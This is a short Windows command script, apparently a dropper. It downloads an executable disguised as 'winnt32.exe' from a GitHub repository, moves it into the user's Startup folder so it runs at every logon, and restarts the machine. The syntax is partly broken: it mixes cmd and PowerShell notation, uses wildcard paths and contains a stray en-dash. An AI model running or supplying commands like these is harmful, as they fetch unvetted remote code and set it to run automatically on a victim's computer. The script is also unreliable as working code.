curl https://github.com/catsruleu/winrick/raw/main/winnt32.exe -O c:\Users\*\Downloads\winnt32.exe
Move-Item –Path c:\Users\*\Downloads\winnt32.exe -Destination %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
Restart-Computer
